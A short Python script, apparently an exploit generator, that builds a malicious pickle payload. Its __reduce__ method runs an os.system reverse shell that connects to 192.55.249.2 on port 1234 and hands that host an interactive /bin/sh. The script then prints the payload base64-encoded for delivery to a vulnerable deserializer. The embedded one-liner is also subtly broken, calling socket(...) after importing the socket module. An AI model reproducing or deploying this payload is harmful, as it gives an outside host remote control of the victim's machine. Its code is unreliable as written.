import pickle
import base64
import subprocess
import os


class Shell(object):
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,subprocess,os;s=socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.55.249.2\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))


pickledData = pickle.dumps(Shell())
print(base64.b64encode(pickledData))
